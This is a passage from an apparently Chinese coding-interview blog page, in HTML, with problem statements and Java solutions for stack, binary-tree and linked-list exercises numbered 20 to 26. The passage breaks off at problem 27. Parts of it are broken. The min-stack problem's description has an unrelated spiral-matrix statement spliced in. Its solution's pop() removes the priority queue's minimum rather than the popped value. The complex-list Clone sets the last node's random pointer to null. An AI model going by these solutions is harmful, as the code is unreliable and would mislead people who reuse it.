      <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span>[][] matrix, <span class="keyword">int</span> row, <span class="keyword">int</span> col, <span class="keyword">int</span> totalrows, <span class="keyword">int</span> totalcols, ArrayList&lt;Integer&gt; res)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//打印上面的行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; totalcols; i++) &#123;</span><br><span class="line">            res.add(matrix[row][col++]);</span><br><span class="line">        &#125;</span><br><span class="line">        col--;</span><br><span class="line">        <span class="comment">//打印右边的列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; totalrows - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            res.add(matrix[++row][col]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//打印下面的行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; totalcols - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            res.add(matrix[row][--col]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//打印左边的列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; totalrows - <span class="number">2</span>; i++) &#123;</span><br><span class="line">            res.add(matrix[--row][col]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="20-包含min函数的栈"><a href="#20-包含min函数的栈" class="headerlink" title="20.包含min函数的栈"></a>20.包含min函数的栈</h3><h4 id="标签：【栈】"><a href="#标签：【栈】" class="headerlink" title="标签：【栈】"></a>标签：【栈】</h4><h4 id="题目描述-19"><a href="#题目描述-19" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>定义栈的数据结构，请在该类型中实现一个能够得到栈中所含最小元素的min函数（时间复杂度应为O（1））。</p><p>注意：保证测试中不会当栈为空的时候，对栈调用pop()或者min()或者top()方法。输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字，例如，如果输入如下4 X 4矩阵： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 则依次打印出数字1,2,3,4,8,12,16,15,14,13,9,5,6,7,11,10.</p></blockquote><h4 id="代码-19"><a href="#代码-19" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">//PriorityQueue太实用了</span></span><br><span class="line">    Stack&lt;Integer&gt; stack = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line">    Queue&lt;Integer&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> node)</span> </span>&#123;</span><br><span class="line">        stack.push(node);</span><br><span class="line">        queue.add(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        stack.pop();</span><br><span class="line">        queue.remove();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stack.peek();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">min</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> queue.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="21-栈的压入、弹出序列"><a href="#21-栈的压入、弹出序列" class="headerlink" title="21.栈的压入、弹出序列"></a>21.栈的压入、弹出序列</h3><h4 id="标签：【栈】-1"><a href="#标签：【栈】-1" class="headerlink" title="标签：【栈】"></a>标签：【栈】</h4><h4 id="题目描述-20"><a href="#题目描述-20" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否可能为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如序列1,2,3,4,5是某栈的压入顺序，序列4,5,3,2,1是该压栈序列对应的一个弹出序列，但4,3,5,1,2就不可能是该压栈序列的弹出序列。（注意：这两个序列的长度是相等的）</p></blockquote><h4 id="代码-20"><a href="#代码-20" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">IsPopOrder</span><span class="params">(<span class="keyword">int</span>[] pushA, <span class="keyword">int</span>[] popA)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pushA == <span class="keyword">null</span> || popA == <span class="keyword">null</span> || pushA.length != popA.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//辅助栈</span></span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (j &lt; popA.length) &#123;</span><br><span class="line">            <span class="comment">//辅助栈包含要出栈的元素，比较实际出栈元素和期望出栈元素是否一致</span></span><br><span class="line">            <span class="keyword">if</span> (stack.contains(popA[j])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (stack.pop() != popA[j]) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                j++;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">//辅助栈不包含则要入栈</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; pushA.length) &#123;</span><br><span class="line">                stack.push(pushA[i]);</span><br><span class="line">                i++;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">//所有元素都一如栈，期望元素不在辅助栈中，说明期望的是一个不存在的数，返回false</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="22-从上往下打印二叉树"><a href="#22-从上往下打印二叉树" class="headerlink" title="22.从上往下打印二叉树"></a>22.从上往下打印二叉树</h3><h4 id="标签：【队列】【树】"><a href="#标签：【队列】【树】" class="headerlink" title="标签：【队列】【树】"></a>标签：【队列】【树】</h4><h4 id="题目描述-21"><a href="#题目描述-21" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>从上往下打印出二叉树的每个节点，同层节点从左至右打印。</p></blockquote><h4 id="代码-21"><a href="#代码-21" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> * int val = 0;</span></span><br><span class="line"><span class="comment"> * TreeNode left = null;</span></span><br><span class="line"><span class="comment"> * TreeNode right = null;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment"> * this.val = val;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">PrintFromTopToBottom</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(root.val);</span><br><span class="line">        <span class="comment">//用一个队列保存结点信息</span></span><br><span class="line">        LinkedList&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        print(res, queue);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(ArrayList&lt;Integer&gt; res, LinkedList&lt;TreeNode&gt; queue)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (queue.size() != <span class="number">0</span>) &#123;</span><br><span class="line">            TreeNode root = queue.remove();</span><br><span class="line">            <span class="keyword">if</span> (root.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">                queue.add(root.left);</span><br><span class="line">                res.add(root.left.val);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (root.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">                queue.add(root.right);</span><br><span class="line">                res.add(root.right.val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="23-二叉搜索树的后序遍历序列"><a href="#23-二叉搜索树的后序遍历序列" class="headerlink" title="23.二叉搜索树的后序遍历序列"></a>23.二叉搜索树的后序遍历序列</h3><h4 id="标签：【栈】【树】"><a href="#标签：【栈】【树】" class="headerlink" title="标签：【栈】【树】"></a>标签：【栈】【树】</h4><h4 id="题目描述-22"><a href="#题目描述-22" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历的结果。如果是则输出Yes,否则输出No。假设输入的数组的任意两个数字都互不相同。</p></blockquote><h4 id="代码-22"><a href="#代码-22" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">VerifySquenceOfBST</span><span class="params">(<span class="keyword">int</span>[] sequence)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sequence == <span class="keyword">null</span> || sequence.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> verify(sequence, <span class="number">0</span>, sequence.length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//一棵 BST ：左孩子 &lt; 根结点 &lt; 右孩子;一棵 BST 的左子树或者右子树都是 BST;左子树区间的所有结点值     //&lt; 根结点值 &lt; 右子树区间所有结点值.</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(<span class="keyword">int</span>[] sequence, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//寻找右子树的开始结点</span></span><br><span class="line">        <span class="keyword">int</span> index = start;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = index; i &lt; end &amp;&amp; sequence[i] &lt; sequence[end]; i++) &#123;</span><br><span class="line">            index++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//右子树进行判断 </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = index; i &lt; end; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sequence[i] &lt;= sequence[end]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//递归</span></span><br><span class="line">        <span class="keyword">return</span> verify(sequence, start, index - <span class="number">1</span>) &amp;&amp; verify(sequence, index, end - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="24-二叉树中和为某一值的路径"><a href="#24-二叉树中和为某一值的路径" class="headerlink" title="24.二叉树中和为某一值的路径"></a>24.二叉树中和为某一值的路径</h3><h4 id="标签：【树】【回溯法】"><a href="#标签：【树】【回溯法】" class="headerlink" title="标签：【树】【回溯法】"></a>标签：【树】【回溯法】</h4><h4 id="题目描述-23"><a href="#题目描述-23" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一颗二叉树的根节点和一个整数，按字典序打印出二叉树中结点值的和为输入整数的所有路径。路径定义为从树的根结点开始往下一直到叶结点所经过的结点形成一条路径。</p></blockquote><h4 id="代码-23"><a href="#代码-23" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> * int val = 0;</span></span><br><span class="line"><span class="comment"> * TreeNode left = null;</span></span><br><span class="line"><span class="comment"> * TreeNode right = null;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment"> * this.val = val;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    Stack&lt;Integer&gt; path = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line">    ArrayList&lt;ArrayList&lt;Integer&gt;&gt; paths = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt; FindPath(TreeNode root, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> paths;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="keyword">null</span> &amp;&amp; root.val == target) &#123;</span><br><span class="line">            path.push(root.val);</span><br><span class="line">            <span class="comment">//注意下ArrayList的这种构造方法</span></span><br><span class="line">            paths.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;(path));</span><br><span class="line">            <span class="keyword">return</span> paths;</span><br><span class="line">        &#125;</span><br><span class="line">        find(root, target);</span><br><span class="line">        <span class="keyword">return</span> paths;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">(TreeNode root, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//回溯法</span></span><br><span class="line">        path.push(root.val);</span><br><span class="line">        <span class="comment">//叶子结点</span></span><br><span class="line">        <span class="keyword">if</span> (root.val == target &amp;&amp; root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span>) &#123;</span><br><span class="line">            paths.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;(path));</span><br><span class="line">            <span class="comment">//出栈</span></span><br><span class="line">            path.pop();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        find(root.left, target - root.val);</span><br><span class="line">        find(root.right, target - root.val);</span><br><span class="line">        <span class="comment">//回溯</span></span><br><span class="line">        path.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="25-复杂链表的复制"><a href="#25-复杂链表的复制" class="headerlink" title="25.复杂链表的复制"></a>25.复杂链表的复制</h3><h4 id="标签：【链表】-4"><a href="#标签：【链表】-4" class="headerlink" title="标签：【链表】"></a>标签：【链表】</h4><h4 id="题目描述-24"><a href="#题目描述-24" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一个复杂链表（每个节点中有节点值，以及两个指针，一个指向下一个节点，另一个特殊指针random指向一个随机节点），请对此链表进行深拷贝，并返回拷贝后的头结点。（注意，输出结果中请不要返回参数中的节点引用，否则判题程序会直接返回空）</p></blockquote><h4 id="代码-24"><a href="#代码-24" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class RandomListNode &#123;</span></span><br><span class="line"><span class="comment">    int label;</span></span><br><span class="line"><span class="comment">    RandomListNode next = null;</span></span><br><span class="line"><span class="comment">    RandomListNode random = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    RandomListNode(int label) &#123;</span></span><br><span class="line"><span class="comment">        this.label = label;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> RandomListNode <span class="title">Clone</span><span class="params">(RandomListNode pHead)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pHead == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//map保存新老结点之间的映射关系</span></span><br><span class="line">        HashMap&lt;RandomListNode, RandomListNode&gt; map = <span class="keyword">new</span> HashMap&lt;RandomListNode, RandomListNode&gt;();</span><br><span class="line">        RandomListNode curr = pHead;</span><br><span class="line">        RandomListNode after = pHead;</span><br><span class="line">        <span class="keyword">while</span> (curr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            map.put(curr, <span class="keyword">new</span> RandomListNode(curr.label));</span><br><span class="line">            curr = curr.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (after.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            map.get(after).next = map.get(after.next);</span><br><span class="line">            map.get(after).random = map.get(after.random);</span><br><span class="line">            after = after.next;</span><br><span class="line">        &#125;</span><br><span class="line">        map.get(after).next = <span class="keyword">null</span>;</span><br><span class="line">        map.get(after).random = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> map.get(pHead);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="26-二叉搜索树与双向链表"><a href="#26-二叉搜索树与双向链表" class="headerlink" title="26.二叉搜索树与双向链表"></a>26.二叉搜索树与双向链表</h3><h4 id="标签：【链表】【二叉搜索树】"><a href="#标签：【链表】【二叉搜索树】" class="headerlink" title="标签：【链表】【二叉搜索树】"></a>标签：【链表】【二叉搜索树】</h4><h4 id="题目描述-25"><a href="#题目描述-25" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。要求不能创建任何新的结点，只能调整树中结点指针的指向。</p></blockquote><h4 id="代码-25"><a href="#代码-25" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> * int val = 0;</span></span><br><span class="line"><span class="comment"> * TreeNode left = null;</span></span><br><span class="line"><span class="comment"> * TreeNode right = null;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment"> * this.val = val;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">//前驱结点</span></span><br><span class="line">    TreeNode pre = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">//链表头</span></span><br><span class="line">    TreeNode firstLeft = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">Convert</span><span class="params">(TreeNode pRootOfTree)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pRootOfTree == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pRootOfTree;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//中序遍历二叉搜索树即得到一个递增的序列</span></span><br><span class="line">        Convert(pRootOfTree.left);</span><br><span class="line">        pRootOfTree.left = pre;</span><br><span class="line">        firstLeft = firstLeft == <span class="keyword">null</span> ? pRootOfTree : firstLeft;</span><br><span class="line">        <span class="keyword">if</span> (pre != <span class="keyword">null</span>) &#123;</span><br><span class="line">            pre.right = pRootOfTree;</span><br><span class="line">        &#125;</span><br><span class="line">        pre = pRootOfTree;</span><br><span class="line">        Convert(pRootOfTree.right);</span><br><span class="line">        <span class="keyword">return</span> firstLeft;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="27-字符串的排序"><a href="#27-字符串的排序" class="headerlink" title="27.字符串的排序"></a>27.字符串的排序</h3><h4 id="标签：【字符串】【动态规划】【递归】"><a href="#标签：【字符串】【动态规划】【递归】" class="headerlink" title="标签：【字符串】【动态规划】【递归】"></a>标签：【字符串】【动态规划】【递归】</h4><h4 id="题目描述-26"><a 